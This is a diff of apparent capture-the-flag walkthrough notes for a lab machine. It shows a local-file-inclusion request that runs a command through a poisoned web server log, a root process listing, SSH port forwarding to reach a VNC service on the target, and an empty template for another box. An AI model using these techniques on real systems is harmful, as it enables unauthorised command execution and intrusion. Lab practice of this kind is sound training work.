@@ -272,12 +272,22 @@ firefox poison.xml
 
 /browse.php?file=/var/log/httpd-access.log?ippsec=uname-a
 
-# root listing of processess
+#### root listing of processess
 ps auxww | grep root
 
-# proxy traffic through ssh via 1080 port & open up 6801 for 5801 on the target box
+#### proxy traffic through ssh via 1080 port & open up 6801 for 5801 on the target box
 ssh -D 1080 -L6801:127.0.0.1:5801 -L6901:127.0.0.1:6901 charix@10.10.10.84
 
 vncviewer 127.0.0.1::6901
 
 ```
+
+
+## 7.sunday
+
+### Approach Taken
+
+
+### Lessons Learnt
+
+### Commands Used
